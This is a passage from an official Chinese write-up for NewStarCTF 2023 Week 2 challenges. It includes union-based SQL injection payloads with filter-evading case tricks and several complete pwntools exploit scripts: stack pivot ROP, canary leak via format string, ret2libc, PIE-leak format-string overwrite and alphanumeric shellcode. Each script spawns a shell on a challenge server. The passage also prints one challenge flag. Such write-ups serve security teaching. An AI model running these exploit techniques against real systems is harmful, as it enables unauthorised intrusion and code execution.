width="1692" height="auto" ori-width="1692" src="./NewStarCTF 2023 Week2 官方WriteUp_files/image.png" ori-height="1159" data-src="https://uploader.shimo.im/f/lsPqnSAArqM8P5rA.png!thumbnail" crossorigin="anonymous"></span></span></span></p><h1 class="ql-align-left"><div ql-global="true" line="snWu" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>ez_sql</div></h1><ul data-list-style="circle"><li ql-global="true" class="bullet-item ql-align-left" line="zuBZ"><strong>考点</strong>：union注入、大小写绕过</li></ul><ul data-list-style="circle"><li ql-global="true" line="nJNH" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="aRW5" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" class="ql-align-left" line="uhCm">给id传 TMP0919'# ，可以查出结果，说明存在注入。#要编码成%23。</p><p ql-global="true" class="ql-align-center" line="jtmB"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="478px" height="auto" ori-width="1599" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1696484980985.png" ori-height="708" data-src="https://uploader.shimo.im/f/4aKMog084RAaarI2.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-left" line="OfgQ">查询的信息可以回显，说明是union注入，然后要判断字段数。</p><div class="ql-code-block-container" data-language="java" word-wrap="" spellcheck="false"><div line="2PnG" data-language="java" class="ql-code-block ql-word-wrap-true">?id=TMP0919<span class="hljs-string">' Order by 1#</span></div></div><p ql-global="true" class="ql-align-left" line="HmNY">从1一直递增，递增到6时，页面不回显，说明字段数是5.</p><div class="ql-code-block-container" data-language="java" word-wrap="" spellcheck="false"><div line="dp5O" data-language="java" class="ql-code-block ql-word-wrap-true">?id=<span class="hljs-number">1</span><span class="hljs-string">' uNion Select 1,2,3,4,5#</span></div></div><p ql-global="true" class="ql-align-center" line="3G3J"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="260px" height="auto" ori-width="603" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1696485291170.png" ori-height="627" data-src="https://uploader.shimo.im/f/ta61Ul4TINSb7yaL.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-left" line="Q376">查询表名</p><div class="ql-code-block-container" data-language="java" word-wrap="" spellcheck="false"><div line="wlw3" data-language="java" class="ql-code-block ql-word-wrap-true">?id=<span class="hljs-number">1</span><span class="hljs-string">' uNion Select ((sElect grOup_cOncat(tAble_name) From infOrmation_schema.tables Where Table_schema=Database())),2,3,4,5%23</span></div></div><p ql-global="true" class="ql-align-center" line="GjkP"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="433px" height="auto" ori-width="1241" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1696486233700.png" ori-height="650" data-src="https://uploader.shimo.im/f/nGJYTLkDesqXs41N.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-left" line="quFp">查询字段名</p><div class="ql-code-block-container" data-language="java" word-wrap="" spellcheck="false"><div line="s0xO" data-language="java" class="ql-code-block ql-word-wrap-true">?id=<span class="hljs-number">1</span><span class="hljs-string">' uNion Select ((sElect grOup_cOncat(column_name) From infOrmation_schema.columns Where Table_name='</span>here_is_flag<span class="hljs-string">')),2,3,4,5%23</span></div></div><p ql-global="true" class="ql-align-center" line="c0ai"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper "><img class="gallery-image" width="376px" height="auto" ori-width="918" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1696486461538.png" ori-height="317" data-src="https://uploader.shimo.im/f/JzwUTNRMR5KcPJv8.png!thumbnail" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-left" line="MCmc"><br></p><p ql-global="true" class="ql-align-left" line="8ssT">查询Flag值:</p><div class="ql-code-block-container" data-language="java" word-wrap="" spellcheck="false"><div line="sZiX" data-language="java" class="ql-code-block ql-word-wrap-true">?id=<span class="hljs-number">1</span><span class="hljs-string">' uNion Select ((sElect grOup_cOncat(flag) From here_is_flag)),2,3,4,5%23</span></div></div><p ql-global="true" class="ql-align-center" line="k5ao"><span class="ql-blot-gallery-embed ql-blot-gallery ql-gallery-margin-none ql-gallery-frame-none"><span class="ql-gallery-editableimage"><span class="img-wrapper cropped"><img class="gallery-image" width="417" height="auto" ori-width="923" src="./NewStarCTF 2023 Week2 官方WriteUp_files/1696486513697(1).png" ori-height="297" data-src="https://uploader.shimo.im/f/z7JhDvreanKDtk9Y.png?sm_xform=image%2Fcrop%2Cx_0%2Cy_0%2Cw_923%2Ch_296%2Fauto-orient%2C1%2Fresize%2Cm_lfit%2Cw_1920%2Fquality%2Cq_75" crossorigin="anonymous"></span></span></span></p><p ql-global="true" class="ql-align-center" line="FpJA"><br></p><p ql-global="true" class="ql-align-center" line="IvUV"><br></p><p ql-global="true" class="ql-align-center" line="HALK"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="JA3l" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Pwn</p><h1><div ql-global="true" line="AKGc" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>stack_migration</div></h1><ul data-list-style="circle"><li ql-global="true" line="hQ5l" class="bullet-item"><strong>考点</strong>：%s leak、栈迁移</li></ul><ul data-list-style="circle"><li ql-global="true" line="O6bi" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="rJFv" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="1bRk">因为printf的%s只有遇到'\x00'才会停止输出，所以可以带出后面的libc地址</p><p ql-global="true" line="QsU4">给了栈地址，就可以栈迁移打rop</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="WWhV" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="UvDb" data-language="python" class="ql-code-block ql-word-wrap-true">context.update(os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)</div><div line="It4l" data-language="python" class="ql-code-block ql-word-wrap-true">binary=<span class="hljs-string">'./pwn'</span></div><div line="twaf" data-language="python" class="ql-code-block ql-word-wrap-true">elf=ELF(binary)</div><div line="KGNR" data-language="python" class="ql-code-block ql-word-wrap-true">libc=ELF(<span class="hljs-string">'./libc.so.6'</span>)</div><div line="B4e2" data-language="python" class="ql-code-block ql-word-wrap-true">debug=<span class="hljs-number">0</span></div><div line="o5HL" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">if</span> debug:</div><div line="2z1d" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; libc=elf.libc</div><div line="q3vA" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p=process(binary)</div><div line="YW2f" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">else</span>:</div><div line="EJxj" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; host=<span class="hljs-string">'127.0.0.1'</span></div><div line="e8Is" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; port=<span class="hljs-string">'1145'</span></div><div line="Ewuj" data-language="python" class="ql-code-block ql-word-wrap-true">&nbsp; &nbsp; p=remote(host,port)</div><div line="bm8A" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="vfTz" data-language="python" class="ql-code-block ql-word-wrap-true">ret = <span class="hljs-number">0x000000000040101a</span></div><div line="56iG" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rdi_ret = <span class="hljs-number">0x0000000000401333</span></div><div line="ceKk" data-language="python" class="ql-code-block ql-word-wrap-true">leave_ret = <span class="hljs-number">0x00000000004012AA</span></div><div line="4pBl" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="4PbQ" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendafter(<span class="hljs-string">"your name:\n"</span>, <span class="hljs-string">b'a'</span>*<span class="hljs-number">8</span>)</div><div line="dNyv" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">'a'</span>*<span class="hljs-number">8</span>)</div><div line="4r3D" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="aYwr" data-language="python" class="ql-code-block ql-word-wrap-true">libc.address = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b'\x00'</span>)) - libc.sym[<span class="hljs-string">"_IO_file_jumps"</span>]</div><div line="DipY" data-language="python" class="ql-code-block ql-word-wrap-true">binsh = <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b"/bin/sh"</span>))</div><div line="Ki1o" data-language="python" class="ql-code-block ql-word-wrap-true">success(<span class="hljs-string">"libc--&gt;"</span> + <span class="hljs-built_in">hex</span>(libc.address))</div><div line="i2BA" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="JNJL" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"I have a small gift for you: "</span>)</div><div line="bgGF" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="fX16" data-language="python" class="ql-code-block ql-word-wrap-true">rop_addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">14</span>), <span class="hljs-number">16</span>) + <span class="hljs-number">8</span></div><div line="Rkrh" data-language="python" class="ql-code-block ql-word-wrap-true">success(<span class="hljs-string">"rop_addr--&gt;"</span> + <span class="hljs-built_in">hex</span>(rop_addr))</div><div line="ugcI" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="BTwr" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"more infomation plz:\n"</span>)</div><div line="mp1a" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="I26L" data-language="python" class="ql-code-block ql-word-wrap-true">pay = p64(pop_rdi_ret) + p64(binsh) + p64(libc.sym[<span class="hljs-string">"system"</span>])</div><div line="J54U" data-language="python" class="ql-code-block ql-word-wrap-true">pay = pay.ljust(<span class="hljs-number">0x50</span>, <span class="hljs-string">b'\x00'</span>)</div><div line="gsu7" data-language="python" class="ql-code-block ql-word-wrap-true">pay += p64(rop_addr - <span class="hljs-number">8</span>)</div><div line="90S9" data-language="python" class="ql-code-block ql-word-wrap-true">pay += p64(leave_ret)</div><div line="y2aZ" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="gJpI" data-language="python" class="ql-code-block ql-word-wrap-true">p.send(pay)</div><div line="P8BR" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="gZ5s" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="02NR"><br></p><h1><div ql-global="true" line="w8Z9" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>canary</div></h1><ul data-list-style="circle"><li ql-global="true" line="3z67" class="bullet-item"><strong>考点</strong>：格式化字符串,栈溢出</li></ul><ul data-list-style="circle"><li ql-global="true" line="07Ia" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="5vgS" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="QvwZ">正如题目名字一样，本题开启了canary保护，可以自行搜索canary的工作原理与绕过方法，需要通过题目中print(buf)这个格式化字符串漏洞来泄露出canary的值，然后将canary的值覆盖到rbp-8的位置，再覆盖rbp和返回地址，来执行ret2text即可</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="va9S" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="ojr8" data-language="python" class="ql-code-block ql-word-wrap-true">context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"debug"</span>)</div><div line="H6ta" data-language="python" class="ql-code-block ql-word-wrap-true">p=remote(<span class="hljs-string">"node4.buuoj.cn"</span>,<span class="hljs-number">25251</span>)</div><div line="z5Un" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># p=process("./canary")</span></div><div line="0rwT" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="cqoS" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"Give me some gift?\n"</span>,<span class="hljs-string">"aaaaaaaa%11$p"</span>.encode())</div><div line="UP8a" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">"aaaaaaaa"</span>)</div><div line="NzF5" data-language="python" class="ql-code-block ql-word-wrap-true">canary=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">b"00"</span>).decode(),<span class="hljs-number">16</span>)</div><div line="at1u" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))</div><div line="zw69" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendafter(<span class="hljs-string">"Show me your magic"</span>,<span class="hljs-string">b'a'</span>*<span class="hljs-number">40</span>+p64(canary)+<span class="hljs-string">b'a'</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x401262</span>))</div><div line="wrqI" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="0Kia"><br></p><h1><div ql-global="true" line="srk2" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>ret2libc</div></h1><ul data-list-style="circle"><li ql-global="true" line="w47P" class="bullet-item"><strong>考点</strong>：栈溢出、ret2libc</li></ul><ul data-list-style="circle"><li ql-global="true" line="3exv" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="MHgI" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="26Pf">存在pop_rdi_ret的gadget，可以将puts_got的值存入rdi，调用puts就可以打印出puts函数的真实地址，从而泄露libc，在libc中寻找system函数，/bin/sh字符串的地址，就可以通过同样的方法调用system('/bin/sh')</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="ZoQ2" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="axxK" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *</div><div line="EuTB" data-language="python" class="ql-code-block ql-word-wrap-true">context(os=<span class="hljs-string">"linux"</span>, arch=<span class="hljs-string">"amd64"</span>, log_level=<span class="hljs-string">"debug"</span>)</div><div line="uryx" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># p = process('./ret2libc')</span></div><div line="mK3c" data-language="python" class="ql-code-block ql-word-wrap-true">p=remote(<span class="hljs-string">'node4.buuoj.cn'</span>,<span class="hljs-number">27442</span>)</div><div line="TZuP" data-language="python" class="ql-code-block ql-word-wrap-true">elf = ELF(<span class="hljs-string">'./ret2libc'</span>)</div><div line="faNC" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libc=ELF('./libc.so.6')</span></div><div line="rV0m" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="yMD6" data-language="python" class="ql-code-block ql-word-wrap-true">puts_plt=elf.plt[<span class="hljs-string">'puts'</span>]</div><div line="dOyL" data-language="python" class="ql-code-block ql-word-wrap-true">puts_got=elf.got[<span class="hljs-string">'puts'</span>]</div><div line="cOdk" data-language="python" class="ql-code-block ql-word-wrap-true">main_addr=<span class="hljs-number">0x400698</span></div><div line="j10Q" data-language="python" class="ql-code-block ql-word-wrap-true">pop_rdi_ret=<span class="hljs-number">0x400763</span></div><div line="hnHK" data-language="python" class="ql-code-block ql-word-wrap-true">ret=<span class="hljs-number">0x4006F1</span></div><div line="rKqU" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="01Bx" data-language="python" class="ql-code-block ql-word-wrap-true">payload=<span class="hljs-string">b'a'</span>*<span class="hljs-number">40</span>+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main_addr)</div><div line="de2Y" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendline(payload)</div><div line="kSS9" data-language="python" class="ql-code-block ql-word-wrap-true">puts_addr=u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))</div><div line="1g2w" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))</div><div line="s8p2" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="AWvM" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># 提供三种计算libc的解法</span></div><div line="HT4k" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># 题目给出libc时</span></div><div line="5zjh" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libc_base &nbsp; = puts_addr - libc.symbols['puts']</span></div><div line="Jw8h" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># system_addr = libc_base + libc.symbols['system']</span></div><div line="UpbQ" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># bin_addr &nbsp; &nbsp;= libc_base + next(libc.search(b'/bin/sh'))</span></div><div line="vXbR" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="aSQP" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libcsearcher</span></div><div line="BkvF" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libc &nbsp; &nbsp; &nbsp; &nbsp;= LibcSearcher("puts",puts_addr)</span></div><div line="tH8A" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libc_base &nbsp; = puts_addr - libc.dump("puts")</span></div><div line="fg55" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># system_addr = libc_base + libc.dump("system")</span></div><div line="6fcp" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># bin_addr &nbsp; &nbsp;= libc_base + libc.dump("str_bin_sh")</span></div><div line="w8sd" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="6ffa" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># libc.blukat.me 查询libc版本后手动计算（推荐）</span></div><div line="x4iH" data-language="python" class="ql-code-block ql-word-wrap-true">libc_base &nbsp; = &nbsp; puts_addr - <span class="hljs-number">0x080970</span></div><div line="Q2re" data-language="python" class="ql-code-block ql-word-wrap-true">system_addr = &nbsp; libc_base + <span class="hljs-number">0x04f420</span></div><div line="K337" data-language="python" class="ql-code-block ql-word-wrap-true">bin_addr &nbsp; &nbsp;= &nbsp; libc_base + <span class="hljs-number">0x1b3d88</span></div><div line="YAIz" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="VloF" data-language="python" class="ql-code-block ql-word-wrap-true">payload2=<span class="hljs-string">b'a'</span>*<span class="hljs-number">40</span>+p64(pop_rdi_ret)+p64(bin_addr)+p64(ret)+p64(system_addr)</div><div line="zypa" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendline(payload2)</div><div line="Q6mH" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="iIac"><br></p><h1><div ql-global="true" line="RfVR" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>secret number</div></h1><ul data-list-style="circle"><li ql-global="true" line="z58M" class="bullet-item"><strong>考点</strong>：printf格式化字符串</li></ul><ul data-list-style="circle"><li ql-global="true" line="Bykl" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="L8lm" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="g3WV">题目开启pie，需要同canary题目一样先通过格式化字符串泄露出pie的基址，从而计算出要修改的num真实地址，然后调用pwntools的fmt_payload函数可以自动生成出格式化字符串，修改需要猜测的num值为我们想要的比如1，然后发送1即可判断成功</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="yOWX" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="SNis" data-language="python" class="ql-code-block ql-word-wrap-true">context(arch=<span class="hljs-string">'amd64'</span>,os=<span class="hljs-string">'linux'</span>,log_level=<span class="hljs-string">'debug'</span>)</div><div line="fvK7" data-language="python" class="ql-code-block ql-word-wrap-true">p=remote(<span class="hljs-string">"node4.buuoj.cn"</span>,<span class="hljs-number">29092</span>)</div><div line="K2q6" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment"># p = process('./secretnumber')</span></div><div line="1WwV" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="Jdxr" data-language="python" class="ql-code-block ql-word-wrap-true">offset=<span class="hljs-number">8</span></div><div line="3NPZ" data-language="python" class="ql-code-block ql-word-wrap-true">num_addr = <span class="hljs-number">0x404c</span></div><div line="dboC" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="nLk0" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">##leak pie</span></div><div line="DwQJ" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"(0/1)\n"</span>,<span class="hljs-string">'1'</span>)</div><div line="ZpH1" data-language="python" class="ql-code-block ql-word-wrap-true">payload = <span class="hljs-string">"aaaaaaaa%17$p"</span>.encode(<span class="hljs-string">"utf-8"</span>)</div><div line="eSal" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"What's it\n"</span>,payload)</div><div line="vaIT" data-language="python" class="ql-code-block ql-word-wrap-true">p.recvuntil(<span class="hljs-string">'aaaaaaaa'</span>)</div><div line="292j" data-language="python" class="ql-code-block ql-word-wrap-true">main_addr=<span class="hljs-built_in">int</span>(p.recvuntil(<span class="hljs-string">'f5'</span>)[-<span class="hljs-number">12</span>:],<span class="hljs-number">16</span>)</div><div line="z6aE" data-language="python" class="ql-code-block ql-word-wrap-true">pie=main_addr-<span class="hljs-number">0x12F5</span></div><div line="CBZO" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(main_addr))</div><div line="IYCN" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(pie))</div><div line="bvzY" data-language="python" class="ql-code-block ql-word-wrap-true">num_addr += pie</div><div line="AqH6" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="6eAh" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">##fmtpayload</span></div><div line="pQki" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"(0/1)\n"</span>,<span class="hljs-string">'1'</span>)</div><div line="EViE" data-language="python" class="ql-code-block ql-word-wrap-true">fmtpayload=fmtstr_payload(offset, {num_addr:<span class="hljs-number">1</span>})</div><div line="yu1m" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"What's it\n"</span>,fmtpayload)</div><div line="aerv" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"(0/1)\n"</span>,<span class="hljs-string">'0'</span>)</div><div line="weGS" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"Guess the number\n"</span>,<span class="hljs-string">'1'</span>)</div><div line="L8mL" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="wlcC"><br></p><h1><div ql-global="true" line="WjMS" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>shellcode revenge</div></h1><ul data-list-style="circle"><li ql-global="true" line="QDJr" class="bullet-item"><strong>考点</strong>：可见字符串shellcode</li></ul><ul data-list-style="circle"><li ql-global="true" line="2Wp5" class="bullet-item"><strong>FLAG</strong>：动态FLAG</li></ul><ul data-list-style="circle"><li ql-global="true" line="wUYK" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="e7YB">题目限制0-9,A-Z的可见字符串输出，用这些字符串生成可以用的shellcode，可以看到一些xor操作，通过xor的操作对寄存器赋值，题目已经预先设置好read的寄存器，只需要执行出syscall就好，syscall的read不限制字符串输入，但是输入的地址是在rsi=0x66660000，目前执行的地址是有一定偏移的，加入一些nop滑板然后直接使用pwntools生成就好。可以参考b站imLZH1师傅的视频BV1Z14y1B7ji</p><div class="ql-code-block-container" data-language="python" word-wrap="" spellcheck="false"><div line="Gdo2" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</div><div line="bvhV" data-language="python" class="ql-code-block ql-word-wrap-true">context(arch=<span class="hljs-string">'amd64'</span>,os=<span class="hljs-string">'linux'</span>,log_level=<span class="hljs-string">'debug'</span>)</div><div line="A27Q" data-language="python" class="ql-code-block ql-word-wrap-true">p = remote(<span class="hljs-string">"node4.buuoj.cn"</span>,<span class="hljs-number">27904</span>)</div><div line="kuQ8" data-language="python" class="ql-code-block ql-word-wrap-true"><span class="hljs-comment">#p = process('./shellcodere')</span></div><div line="rW08" data-language="python" class="ql-code-block ql-word-wrap-true"><br></div><div line="tiB5" data-language="python" class="ql-code-block ql-word-wrap-true">payload =&nbsp; <span class="hljs-string">b'\x33\x42\x38'</span>&nbsp; <span class="hljs-comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></div><div line="2fc2" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'\x31\x42\x30'</span>&nbsp; <span class="hljs-comment">#31 42 30 xor DWORD PTR [rdx+0x30], eax</span></div><div line="vaVs" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'\x33\x42\x37'</span>&nbsp; <span class="hljs-comment">#33 42 38 xor eax, DWORD PTR [rdx+0x38]</span></div><div line="r7MW" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'\x31\x42\x38'</span>&nbsp; <span class="hljs-comment">#31 42 38 xor DWORD PTR [rdx+0x38], eax</span></div><div line="1vRp" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'\x59'</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-built_in">len</span>(payload))&nbsp; <span class="hljs-comment">#59 pop rcx</span></div><div line="Yf4m" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'\x4e\x44'</span>*<span class="hljs-number">2</span>&nbsp; &nbsp; <span class="hljs-comment">#syscall&nbsp; 0x4e^0x41=0xf 0x44^0x41=0x5</span></div><div line="eONf" data-language="python" class="ql-code-block ql-word-wrap-true">payload += <span class="hljs-string">b'A'</span>*<span class="hljs-number">8</span>&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span class="hljs-comment">#xor key</span></div><div line="LZ28" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendlineafter(<span class="hljs-string">"magic\n"</span>,payload)</div><div line="dCwu" data-language="python" class="ql-code-block ql-word-wrap-true">pause()</div><div line="PM3f" data-language="python" class="ql-code-block ql-word-wrap-true">p.sendline(<span class="hljs-string">b'\x90'</span>*<span class="hljs-number">0x50</span>+asm(shellcraft.sh()))</div><div line="31lc" data-language="python" class="ql-code-block ql-word-wrap-true">p.interactive()</div></div><p ql-global="true" line="ZTAk"><br></p><p ql-global="true" class="ql-align-center ql-heading-title" line="DgTC" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span>Misc</p><h1><div ql-global="true" line="jSqA" data-header="1" data-foldable=""><span class="ql-folder"><button type="button" class="ql-folder-trigger"></button></span><span class="ql-font-microsoftyahei">Jvav</span></div></h1><ul data-list-style="circle"><li ql-global="true" line="OTGc" class="bullet-item"><strong>考点</strong>：JAVA盲水印</li></ul><ul data-list-style="circle"><li ql-global="true" line="DDXb" class="bullet-item"><strong>FLAG</strong>：<span class="ql-font-microsoftyahei">flag{3bb3c3a628a94c}</span></li></ul><ul data-list-style="circle"><li ql-global="true" line="IqvG" class="bullet-item"><strong>解题步骤</strong></li></ul><p ql-global="true" line="zXts">根据题目提示，参考题目名Jvav，可以检阅到Java盲水印的知识。</p><p ql-global="true" line="YwaP">可以利用这个项目来提取Java盲水印内容：<a class="ql-link" 